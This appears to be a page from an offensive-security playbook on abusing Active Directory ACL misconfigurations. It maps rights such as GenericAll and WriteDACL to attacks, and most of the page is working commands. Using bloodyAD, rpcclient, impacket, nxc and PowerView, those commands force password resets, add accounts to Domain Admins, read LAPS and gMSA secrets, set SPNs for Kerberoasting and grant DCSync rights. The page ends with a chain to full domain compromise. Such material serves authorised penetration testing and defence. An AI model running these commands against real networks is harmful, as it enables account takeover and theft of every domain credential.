---
id: acl-abuse
title: ACL Abuse (AD)
stage: privesc
tags: [windows, ad]
summary: Exploit Active Directory ACL misconfigurations — GenericAll, WriteDACL, ForceChangePassword, and similar edges identified by BloodHound translate directly into account takeover or DCSync.
leads_to:
  - dcsync
  - winrm
  - domain-admin
---

## Prerequisites

A valid domain account with at least one abusable ACL edge visible in BloodHound. bloodyAD installed on attacker (Linux-side abuse) or PowerView available (Windows-side). Run BloodHound first — ACL abuse without a map is guesswork.

Active Directory ACLs control who can do what to AD objects. When a low-privilege user has `GenericAll` over a DA account, they can reset that DA's password. `WriteDACL` on the domain object allows granting yourself DCSync rights. BloodHound visualizes all of this — the "Outbound Object Control" section on any node shows every object that node has a right over.

## Quick Win

> Force-reset the target account's password using bloodyAD — no Windows shell required.

```bash
bloodyAD -u user -p 'password' -d $DOMAIN --host $DC_IP set password target_user 'NewPass123!'
```

## Common Abusable ACLs

| ACL | Object | Abuse |
|---|---|---|
| `GenericAll` | user | Force password reset |
| `GenericAll` | group | Add yourself to group |
| `GenericWrite` | user | Write SPN → Kerberoast |
| `ForceChangePassword` | user | Reset without knowing current password |
| `WriteOwner` | any | Change owner → grant yourself GenericAll |
| `WriteDACL` | domain | Grant yourself DCSync rights |
| `AddSelf` | group | Add yourself to group |
| `ReadLAPSPassword` | computer | Read local admin password |
| `ReadGMSAPassword` | computer | Read gMSA account NTLM hash |

## From Linux (bloodyAD)

> bloodyAD abuses ACLs over LDAP — no Windows shell needed, just valid creds.

```bash
# Force password reset (GenericAll / ForceChangePassword)
bloodyAD -u user -p 'password' -d $DOMAIN --host $DC_IP set password target_user 'NewPass123!'

# Alternative via rpcclient (no extra tools)
rpcclient $DC_IP -U "$DOMAIN/user%password" -c "setuserinfo2 target_user 23 'NewPass123!'"

# Add yourself to a group
bloodyAD -u user -p 'password' -d $DOMAIN --host $DC_IP add groupMember "Domain Admins" attacker_user

# Read LAPS password
bloodyAD -u user -p 'password' -d $DOMAIN --host $DC_IP get search \
  --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd

# Read gMSA password → NT hash
nxc ldap $DC_IP -u user -p 'password' --gmsa

# Write SPN → Kerberoast (GenericWrite on user)
bloodyAD -u user -p 'password' -d $DOMAIN --host $DC_IP set object target_user servicePrincipalName -v 'fake/spn'
impacket-GetUserSPNs $DOMAIN/user:password -dc-ip $DC_IP -request

# Grant DCSync rights (WriteDACL on domain)
impacket-dacledit $DOMAIN/user:password -action write -rights DCSync \
  -target-dn "DC=domain,DC=local" -principal user -dc-ip $DC_IP
```

## From Windows (PowerView)

> PowerView for when you have a Windows shell — cleaner syntax for group and ACL manipulation.

```powershell
# Force password reset
Set-DomainUserPassword -Identity target_user -AccountPassword (ConvertTo-SecureString "NewPass123!" -AsPlainText -Force)

# Add to group
Add-DomainGroupMember -Identity "Domain Admins" -Members $env:USERNAME

# Write SPN → Kerberoast
Set-DomainObject -Identity target_user -SET @{serviceprincipalname='fake/spn'}

# Read LAPS
Get-DomainComputer target_host -Properties ms-mcs-admpwd
```

## Leads To

Password reset on DA account → authenticate as DA → DCSync for all hashes → domain-admin. Added to Domain Admins group → same. DCSync rights granted → run secretsdump immediately. gMSA hash retrieved → PTH with evil-winrm → winrm access. After any ACL exploit: re-mark the new account as Owned in BloodHound and re-run "Shortest Paths from Owned Principals".
